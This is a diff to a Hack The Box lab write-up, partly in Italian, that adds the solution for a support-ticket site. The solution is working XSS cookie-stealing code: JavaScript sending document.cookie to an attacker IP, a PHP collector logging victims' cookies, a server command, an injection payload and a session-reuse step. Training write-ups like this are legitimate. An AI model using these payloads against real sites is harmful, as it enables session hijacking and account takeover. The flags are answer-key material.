@@ -600,6 +600,42 @@ HTB{dbca4dc5d99cdb3311404ea74921553c}
 
 ## support.inlanefreight.local
 
+script.js:
+
+```javascript
+document.location='http://10.10.15.1/index.php?c='+document.cookie;
+new Image().src='http://10.10.15.1/index.php?c='+document.cookie;
+```
+
+index.php:
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
+
+start a server with both files:
+
+```
+sudo php -S 0.0.0.0:80
+```
+
+incolla nel campo Message
+
+"><script>src=http://10.10.15.1/script.js></script>
+
+
+metti il cookie con cookie editor 
+
 HTB{1nS3cuR3_c00k135}
 
 |Ticket ID|Ticket Name|Status|
